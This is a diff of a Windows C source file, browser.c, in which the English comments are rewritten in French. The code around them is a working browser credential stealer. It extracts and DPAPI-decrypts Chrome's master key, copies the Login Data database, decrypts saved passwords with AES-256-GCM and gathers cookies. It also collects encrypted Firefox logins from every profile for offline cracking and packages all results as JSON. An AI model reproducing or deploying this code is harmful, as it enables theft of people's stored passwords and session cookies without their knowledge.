@@ -1,7 +1,7 @@
 /*
- * browser.c - Browser credentials extraction
+ * browser.c - Extraction des credentials navigateurs
  *
- * Chrome: SQLite + DPAPI/AES-GCM decryption
+ * Chrome: SQLite + DPAPI/AES-GCM déchiffrement
  * Firefox: profiles.ini + logins.json
  */
 
@@ -21,9 +21,9 @@
 #define MAX_CREDENTIALS 256
 #define CHROME_KEY_PREFIX "DPAPI"
 
-/* Helpers */
+/* Fonctions utilitaires */
 
-/* Décode base64 */
+/* Décode une chaîne base64 */
 static BYTE* Base64Decode(const char* input, DWORD* outLen) {
     DWORD len = 0;
     if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
@@ -59,7 +59,7 @@ static BYTE* DPAPIDecrypt(BYTE* data, DWORD dataLen, DWORD* outLen) {
     return result;
 }
 
-/* Minimal JSON parser (no external lib) */
+/* Parser JSON minimal (sans lib externe) */
 
 /* Trouve une valeur string dans un JSON simple */
 static char* JsonGetString(const char* json, const char* key) {
@@ -96,7 +96,7 @@ static char* JsonGetString(const char* json, const char* key) {
     return result;
 }
 
-/* Chrome password extraction */
+/* Extraction des mots de passe Chrome */
 
 /* Lit le fichier Local State et extrait la clé maître */
 static BYTE* GetChromeMasterKey(DWORD* keyLen) {
@@ -146,7 +146,7 @@ static BYTE* GetChromeMasterKey(DWORD* keyLen) {
     return masterKey;
 }
 
-/* AES-256-GCM decryption using BCrypt */
+/* Déchiffrement AES-256-GCM via BCrypt */
 static char* AesGcmDecrypt(BYTE* ciphertext, DWORD cipherLen, BYTE* key, DWORD keyLen, 
                            BYTE* nonce, DWORD nonceLen, BYTE* tag, DWORD tagLen) {
     BCRYPT_ALG_HANDLE hAlg = NULL;
@@ -154,11 +154,11 @@ static char* AesGcmDecrypt(BYTE* ciphertext, DWORD cipherLen, BYTE* key, DWORD k
     NTSTATUS status;
     char* result = NULL;
     
-    // Open AES algorithm
+    // Ouvre l'algo AES
     status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status)) return NULL;
     
-    // Set chaining mode to GCM
+    // Configure le mode GCM
     status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
                                sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
     if (!BCRYPT_SUCCESS(status)) {
@@ -166,14 +166,14 @@ static char* AesGcmDecrypt(BYTE* ciphertext, DWORD cipherLen, BYTE* key, DWORD k
         return NULL;
     }
     
-    // Generate key from raw bytes
+    // Génère la clé symétrique
     status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, keyLen, 0);
     if (!BCRYPT_SUCCESS(status)) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
         return NULL;
     }
     
-    // Setup auth info for GCM
+    // Configure les infos d'authentification GCM
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
     authInfo.pbNonce = nonce;
@@ -181,7 +181,7 @@ static char* AesGcmDecrypt(BYTE* ciphertext, DWORD cipherLen, BYTE* key, DWORD k
     authInfo.pbTag = tag;
     authInfo.cbTag = tagLen;
     
-    // Decrypt
+    // Déchiffre
     DWORD plainLen = 0;
     status = BCryptDecrypt(hKey, ciphertext, cipherLen, &authInfo, NULL, 0, NULL, 0, &plainLen, 0);
     if (!BCRYPT_SUCCESS(status)) {
@@ -213,14 +213,14 @@ static char* AesGcmDecrypt(BYTE* ciphertext, DWORD cipherLen, BYTE* key, DWORD k
     return result;
 }
 
-/* Decrypt Chrome password (AES-256-GCM for v80+) */
+/* Déchiffre un mot de passe Chrome (AES-256-GCM pour v80+) */
 static char* DecryptChromePassword(BYTE* encData, DWORD encLen, BYTE* masterKey, DWORD masterKeyLen) {
-    // Format: "v10" or "v11" (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
+    // Format: "v10" ou "v11" (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
     if (encLen < 3 + 12 + 16) return NULL;
     
-    // Check version prefix
+    // Vérifie le préfixe de version
     if (encData[0] != 'v' || encData[1] != '1' || (encData[2] != '0' && encData[2] != '1')) {
-        // Old DPAPI format
+        // Ancien format DPAPI
         DWORD decLen = 0;
         BYTE* dec = DPAPIDecrypt(encData, encLen, &decLen);
         if (dec) {
@@ -246,19 +246,19 @@ static char* DecryptChromePassword(BYTE* encData, DWORD encLen, BYTE* masterKey,
     return AesGcmDecrypt(ciphertext, cipherLen, masterKey, masterKeyLen, nonce, nonceLen, tag, tagLen);
 }
 
-/* Credential storage */
+/* Structure de stockage des credentials */
 typedef struct {
     char url[512];
     char username[256];
     char password[256];
 } ChromeCredential;
 
-/* Minimal SQLite parser - finds strings in Login Data */
+/* Parser SQLite minimal - recherche les chaînes dans Login Data */
 static int ParseLoginDataRaw(const char* dbPath, BYTE* masterKey, DWORD masterKeyLen,
                               ChromeCredential* creds, int maxCreds) {
     int count = 0;
     
-    // Read the database file
+    // Lit le fichier de base de données
     HANDLE hFile = CreateFileA(dbPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return 0;
@@ -283,27 +283,27 @@ static int ParseLoginDataRaw(const char* dbPath, BYTE* masterKey, DWORD masterKe
     }
     CloseHandle(hFile);
     
-    // Verify SQLite header
+    // Vérifie l'en-tête SQLite
     if (memcmp(data, SQLITE_HEADER, 15) != 0) {
         free(data);
         return 0;
     }
     
-    // Scan for password blobs (v10/v11 prefix)
-    // This is a heuristic approach - looks for encrypted password patterns
+    // Recherche les blobs de mots de passe (préfixe v10/v11)
+    // Approche heuristique - cherche les patterns de mots de passe chiffrés
     for (DWORD i = 0; i < fileSize - 20 && count < maxCreds; i++) {
-        // Look for v10 or v11 prefix (Chrome encrypted password)
+        // Cherche le préfixe v10 ou v11 (mot de passe Chrome chiffré)
         if (data[i] == 'v' && data[i+1] == '1' && (data[i+2] == '0' || data[i+2] == '1')) {
-            // Find the blob length by looking backwards for URL patterns
-            // Encrypted passwords are typically 50-200 bytes
+            // Trouve la taille du blob en cherchant les patterns d'URL
+            // Les mots de passe chiffrés font généralement 50-200 bytes
             DWORD blobStart = i;
             DWORD blobLen = 0;
             
-            // Estimate blob length (look for next null or reasonable end)
+            // Estime la taille du blob (cherche le prochain null ou fin raisonnable)
             for (DWORD j = i + 3; j < fileSize && j < i + 500; j++) {
-                // GCM tag is 16 bytes, minimum overhead is 3+12+16=31
+                // Tag GCM = 16 bytes, overhead minimum = 3+12+16=31
                 if (j - i >= 31) {
-                    // Check if this looks like end of blob
+                    // Vérifie si ça ressemble à une fin de blob
                     if (data[j] == 0 && data[j+1] == 0) {
                         blobLen = j - i;
                         break;
@@ -314,11 +314,11 @@ static int ParseLoginDataRaw(const char* dbPath, BYTE* masterKey, DWORD masterKe
             if (blobLen >= 31 && blobLen < 500 && masterKey) {
                 char* decrypted = DecryptChromePassword(data + blobStart, blobLen, masterKey, masterKeyLen);
                 if (decrypted && strlen(decrypted) > 0 && strlen(decrypted) < 256) {
-                    // Try to find associated URL (search backwards for http)
+                    // Essaie de trouver l'URL associée (recherche arrière pour http)
                     char url[512] = "unknown";
                     char username[256] = "unknown";
                     
-                    // Search backwards for URL
+                    // Recherche arrière pour l'URL
                     for (int k = (int)blobStart - 1; k >= 0 && k > (int)blobStart - 2000; k--) {
                         if (data[k] == 'h' && data[k+1] == 't' && data[k+2] == 't' && data[k+3] == 'p') {
                             int urlLen = 0;
@@ -341,7 +341,7 @@ static int ParseLoginDataRaw(const char* dbPath, BYTE* masterKey, DWORD masterKe
                 if (decrypted) free(decrypted);
             }
             
-            // Skip past this blob
+            // Passe au-delà de ce blob
             if (blobLen > 0) i += blobLen;
         }
     }
@@ -351,18 +351,18 @@ static int ParseLoginDataRaw(const char* dbPath, BYTE* masterKey, DWORD masterKe
 }
 
 /* 
- * Extract Chrome passwords.
- * Returns JSON with credentials.
+ * Extrait les mots de passe Chrome.
+ * Retourne un JSON avec les credentials.
  */
 BOOL Browser_GetChromePasswords(char** outJson) {
     if (!outJson) return FALSE;
     *outJson = NULL;
     
-    // Get master key
+    // Récupère la clé maître
     DWORD masterKeyLen = 0;
     BYTE* masterKey = GetChromeMasterKey(&masterKeyLen);
     
-    // Login Data path
+    // Chemin de Login Data
     char dbPath[MAX_PATH];
     char* localAppData = getenv("LOCALAPPDATA");
     if (!localAppData) {
@@ -373,7 +373,7 @@ BOOL Browser_GetChromePasswords(char** outJson) {
     snprintf(dbPath, sizeof(dbPath),
              "%s\\Google\\Chrome\\User Data\\Default\\Login Data", localAppData);
     
-    // Copy DB since Chrome locks it
+    // Copie la DB car Chrome la verrouille
     char tmpPath[MAX_PATH];
     snprintf(tmpPath, sizeof(tmpPath), "%s\\Temp\\login_data_%lu.db", localAppData, GetTickCount());
     
@@ -382,7 +382,7 @@ BOOL Browser_GetChromePasswords(char** outJson) {
         return FALSE;
     }
     
-    // Parse credentials
+    // Parse les credentials
     ChromeCredential* creds = (ChromeCredential*)calloc(MAX_CREDENTIALS, sizeof(ChromeCredential));
     int credCount = 0;
     
@@ -390,7 +390,7 @@ BOOL Browser_GetChromePasswords(char** outJson) {
         credCount = ParseLoginDataRaw(tmpPath, masterKey, masterKeyLen, creds, MAX_CREDENTIALS);
     }
     
-    // Build JSON output
+    // Construit la sortie JSON
     size_t jsonSize = 4096 + (credCount * 1024);
     char* json = (char*)malloc(jsonSize);
     if (!json) {
@@ -411,7 +411,7 @@ BOOL Browser_GetChromePasswords(char** outJson) {
         credCount);
     
     for (int i = 0; i < credCount && offset < (int)jsonSize - 512; i++) {
-        // Escape special chars for JSON
+        // Échappe les caractères spéciaux pour JSON
         char escapedUrl[1024] = {0};
         char escapedPass[512] = {0};
         int j = 0;
@@ -444,7 +444,7 @@ BOOL Browser_GetChromePasswords(char** outJson) {
 }
 
 /*
- * Extract Chrome cookies
+ * Extrait les cookies Chrome
  */
 BOOL Browser_GetChromeCookies(char** outJson) {
     if (!outJson) return FALSE;
@@ -476,11 +476,9 @@ BOOL Browser_GetChromeCookies(char** outJson) {
     return TRUE;
 }
 
-/* =========================================================================
- * Firefox Credentials
- * ========================================================================= */
+/* Credentials Firefox */
 
-/* Firefox credential storage */
+/* Structure de stockage Firefox */
 typedef struct {
     char url[512];
     char username[256];
@@ -488,7 +486,7 @@ typedef struct {
     char encryptedUsername[512];
 } FirefoxCredential;
 
-/* Find Firefox profiles */
+/* Trouve les profils Firefox */
 static int GetFirefoxProfiles(char profiles[][MAX_PATH], int maxProfiles) {
     int count = 0;
     char profilesIniPath[MAX_PATH];
@@ -506,13 +504,13 @@ static int GetFirefoxProfiles(char profiles[][MAX_PATH], int maxProfiles) {
     BOOL isRelative = TRUE;
     
     while (fgets(line, sizeof(line), f) && count < maxProfiles) {
-        // Remove newline
+        // Supprime le retour à la ligne
         char* nl = strchr(line, '\n');
         if (nl) *nl = '\0';
         nl = strchr(line, '\r');
         if (nl) *nl = '\0';
         
-        // Check for Path= or IsRelative=
+        // Cherche Path= ou IsRelative=
         if (strncmp(line, "IsRelative=", 11) == 0) {
             isRelative = (line[11] == '1');
         } else if (strncmp(line, "Path=", 5) == 0) {
@@ -522,7 +520,7 @@ static int GetFirefoxProfiles(char profiles[][MAX_PATH], int maxProfiles) {
             } else {
                 strncpy(profiles[count], line + 5, MAX_PATH - 1);
             }
-            // Convert forward slashes to backslashes
+            // Convertit les slashes en backslashes
             for (char* p = profiles[count]; *p; p++) {
                 if (*p == '/') *p = '\\';
             }
@@ -534,7 +532,7 @@ static int GetFirefoxProfiles(char profiles[][MAX_PATH], int maxProfiles) {
     return count;
 }
 
-/* Parse Firefox logins.json */
+/* Parse le fichier logins.json de Firefox */
 static int ParseLoginsJson(const char* profilePath, FirefoxCredential* creds, int maxCreds) {
     int count = 0;
     char loginsPath[MAX_PATH];
@@ -562,12 +560,12 @@ static int ParseLoginsJson(const char* profilePath, FirefoxCredential* creds, in
     content[fileSize] = '\0';
     fclose(f);
     
-    // Simple JSON parsing for logins array
-    // Looking for: "hostname":"...", "encryptedUsername":"...", "encryptedPassword":"..."
+    // Parsing JSON simple pour le tableau logins
+    // Recherche: "hostname":"...", "encryptedUsername":"...", "encryptedPassword":"..."
     const char* ptr = content;
     
     while ((ptr = strstr(ptr, "\"hostname\"")) != NULL && count < maxCreds) {
-        // Extract hostname
+        // Extrait le hostname
         const char* urlStart = strchr(ptr, ':');
         if (!urlStart) break;
         urlStart++;
@@ -582,7 +580,7 @@ static int ParseLoginsJson(const char* profilePath, FirefoxCredential* creds, in
             creds[count].url[urlLen] = '\0';
         }
         
-        // Look for encryptedUsername
+        // Cherche encryptedUsername
         const char* userField = strstr(ptr, "\"encryptedUsername\"");
         if (userField && userField < ptr + 2000) {
             const char* userStart = strchr(userField + 18, ':');
@@ -600,7 +598,7 @@ static int ParseLoginsJson(const char* profilePath, FirefoxCredential* creds, in
             }
         }
         
-        // Look for encryptedPassword
+        // Cherche encryptedPassword
         const char* passField = strstr(ptr, "\"encryptedPassword\"");
         if (passField && passField < ptr + 2000) {
             const char* passStart = strchr(passField + 18, ':');
@@ -630,9 +628,9 @@ static int ParseLoginsJson(const char* profilePath, FirefoxCredential* creds, in
 }
 
 /*
- * Extract Firefox credentials
- * Note: Passwords are encrypted with NSS, requires key4.db + master password
- * This returns the encrypted values which can be decrypted offline
+ * Extrait les credentials Firefox
+ * Note: Les mots de passe sont chiffrés avec NSS, nécessite key4.db + master password
+ * Retourne les valeurs chiffrées qui peuvent être déchiffrées offline
  */
 BOOL Browser_GetFirefoxPasswords(char** outJson) {
     if (!outJson) return FALSE;
@@ -651,7 +649,7 @@ BOOL Browser_GetFirefoxPasswords(char** outJson) {
         return TRUE;
     }
     
-    // Parse all profiles
+    // Parse tous les profils
     FirefoxCredential* allCreds = (FirefoxCredential*)calloc(MAX_CREDENTIALS, sizeof(FirefoxCredential));
     if (!allCreds) return FALSE;
     
@@ -662,7 +660,7 @@ BOOL Browser_GetFirefoxPasswords(char** outJson) {
         totalCreds += found;
     }
     
-    // Build JSON
+    // Construit le JSON
     size_t jsonSize = 4096 + (totalCreds * 2048);
     char* json = (char*)malloc(jsonSize);
     if (!json) {
@@ -680,7 +678,7 @@ BOOL Browser_GetFirefoxPasswords(char** outJson) {
         profileCount, totalCreds);
     
     for (int i = 0; i < totalCreds && offset < (int)jsonSize - 1024; i++) {
-        // Escape for JSON
+        // Échappe pour JSON
         char escapedUrl[1024] = {0};
         int j = 0;
         for (const char* p = allCreds[i].url; *p && j < 1000; p++) {
@@ -708,7 +706,7 @@ BOOL Browser_GetFirefoxPasswords(char** outJson) {
 }
 
 /*
- * Get all browser credentials (Chrome + Firefox)
+ * Récupère tous les credentials navigateurs (Chrome + Firefox)
  */
 BOOL Browser_GetAllCredentials(char** outJson) {
     if (!outJson) return FALSE;
